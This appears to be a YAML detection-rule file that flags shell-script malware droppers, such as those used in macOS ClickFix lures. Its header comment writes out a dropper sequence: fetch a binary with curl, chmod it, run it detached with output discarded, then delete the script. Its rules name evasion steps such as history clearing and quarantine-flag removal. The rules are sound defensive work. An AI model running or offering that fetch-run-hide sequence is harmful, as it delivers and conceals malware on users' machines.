# Native-binary stealth dropper (shell).
#
# POSIX-shell counterpart to node.yaml in this directory. Same data-flow shape,
# same discriminator, different carrier — and the carrier that macOS ClickFix
# campaigns actually use, because the victim pastes the stage-1 script into
# Terminal themselves:
#
#   curl -fsSL <url> -o "$BIN"
#   chmod +x "$BIN"
#   nohup "$BIN" >/dev/null 2>&1 &
#   rm -f -- "$0"
#
# Behavior over IOCs: no host, path or filename is keyed, so the rule survives
# infrastructure rotation and re-skinned lures.
#
# FP boundary — this is the same boundary node.yaml documents, restated for
# shell. Legitimate install scripts also fetch a binary, chmod it and run it;
# what they do not do is run it *detached with its output discarded*. An
# installer's whole purpose is for the user to watch it work, and a build
# script needs the exit status. Backgrounding a just-downloaded binary into
# /dev/null means nothing is meant to be seen — and the fourth leg (the script
# erasing its own tracks afterwards) confirms the intent, since no installer
# deletes itself, wipes shell history, or has a reason to remove the
# quarantine flag from something it just downloaded.
defaults:
  platforms: [macos, linux, unix]
  for: [shell]
  attack: T1105
  mbc: B0024

composite_rules:
  - id: world-writable-local-binary-exec
    desc: World-writable local binary execution
    crit: suspicious
    conf: 0.88
    attack: T1222.002
    all:
      - id: micro-behaviors/fs/chmod/executable/dangerous::shell-777
      - id: micro-behaviors/process/create/local-exec::execute-dot-slash-literal
    near_bytes: 160

  - id: shell-fetch-chmod-stealth-exec-dropper
    desc: Shell fetches, chmods and hides a payload run
    crit: hostile
    conf: 0.96
    attack: T1105,T1222.002,T1564.003,T1070
    all:
      - id: micro-behaviors/communications/http/download/cli::fetch-output-flag-script
      - id: micro-behaviors/fs/chmod/executable/mode
      - id: micro-behaviors/process/daemonize/detach::stealthy-background
    any:
      # Anti-forensics: the dropper removes what would let anyone reconstruct
      # what ran, or clears the provenance flag Gatekeeper would have used.
      - id: objectives/evasion/self-delete/cleanup/remove::rm-self-dollar-zero
      - id: objectives/evasion/indicator-removal/logs::history-clear-call
      - id: micro-behaviors/fs/attributes/xattr::xattr-quarantine-remove
